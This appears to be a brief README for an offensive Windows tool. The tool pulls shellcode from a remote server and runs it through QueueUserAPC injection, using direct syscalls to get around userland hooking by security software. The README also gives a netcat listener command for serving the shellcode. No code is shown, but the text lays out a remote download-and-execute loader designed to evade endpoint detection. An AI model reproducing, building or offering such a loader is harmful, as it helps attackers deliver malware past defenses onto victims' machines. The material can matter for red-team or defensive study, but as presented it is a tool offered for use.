# 0xrob-HostedShellcode-QueueUserAPC-Syscall

This allows you to pull shellcode from a server and execute it via QueueUserAPC with syscalls to bypass userland hooking

shellcode can be hosted easily with something like

nc -vnlp 8080 < /Path/To/Shellcode
